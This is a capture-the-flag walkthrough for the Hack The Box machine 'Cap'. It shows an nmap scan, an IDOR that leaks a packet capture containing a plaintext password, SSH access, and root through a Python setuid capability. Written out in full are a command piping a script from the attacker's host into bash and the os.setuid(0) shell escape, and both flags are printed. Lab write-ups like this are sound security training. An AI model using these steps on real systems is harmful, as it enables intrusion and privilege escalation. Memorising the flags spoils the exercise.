---
type: Ctf
title: Cap
tags: []
---

# Cap

![image](../Images/Media/image.png)
[image](../Images/image.md)

## NMAP SCAN

```bash
nmap  -sC -sV -vv -p- -oA cap 10.10.10.245
```

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 00:46 +0000
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
Initiating Ping Scan at 00:46
Scanning 10.10.10.245 [4 ports]
Completed Ping Scan at 00:46, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:46
Scanning cap (10.10.10.245) [65535 ports]
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 00:46, 17.39s elapsed (65535 total ports)
Initiating Service scan at 00:46
Scanning 3 services on cap (10.10.10.245)
Completed Service scan at 00:46, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.245.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:47, 3.48s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Nmap scan report for cap (10.10.10.245)
Host is up, received echo-reply ttl 63 (0.043s latency).
Scanned at 2026-01-06 00:46:34 GMT for 28s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
           Raw packets sent: 65749 (2.893MB) | Rcvd: 65536 (2.621MB)
```

## Port 80



![image](../Images/Media/image%20(1).png)
[image](../Images/image%20(1).md)

### Security Snapshot (5 Second PCAP + Analysis)

![image](../Images/Media/image%20(2).png)
[image](../Images/image%20(2).md)

#### IDOR

```text
http://cap/data/0
```

![image](../Images/Media/image%20(3).png)
[image](../Images/image%20(3).md)

Download file 0.pcap

![image](../Images/Media/image%20(4).png)
[image](../Images/image%20(4).md)


## Wireshark

![image](../Images/Media/image%20(5).png)
[image](../Images/image%20(5).md)

![image](../Images/Media/image%20(6).png)
[image](../Images/image%20(6).md)

![image](../Images/Media/image%20(7).png)
[image](../Images/image%20(7).md)

Password: `Buck3tH4TF0RM3`



```bash
ssh nathan@10.10.10.245
```

![image](../Images/Media/image%20(8).png)
[image](../Images/image%20(8).md)

![image](../Images/Media/image%20(9).png)
[image](../Images/image%20(9).md)

First flag: `010d60c4f5812177e140f01a4388cf4a`



## Privilege Escalation

[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
wget https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
```

![image](../Images/Media/image%20(10).png)
[image](../Images/image%20(10).md)

Send the file `linpeas.sh` to thetarget machine
​

```bash
python3 -m http.server
```

![image](../Images/Media/image%20(11).png)
[image](../Images/image%20(11).md)

```bash
wget 10.10.15.237:8000/linpeas.sh
```



![image](../Images/Media/image%20(12).png)
[image](../Images/image%20(12).md)

```bash
curl 10.10.15.237:8000/linpeas.sh | bash
```

![image](../Images/Media/image%20(13).png)
[image](../Images/image%20(13).md)

![image](../Images/Media/image%20(14).png)
[image](../Images/image%20(14).md)

[https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

![image](../Images/Media/image%20(15).png)
[image](../Images/image%20(15).md)

```bash
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

![image](../Images/Media/image%20(16).png)
[image](../Images/image%20(16).md)

![image](../Images/Media/image%20(17).png)
[image](../Images/image%20(17).md)

Second flag: `55f2ccfd78e10625d85cbbd696f7e64b`

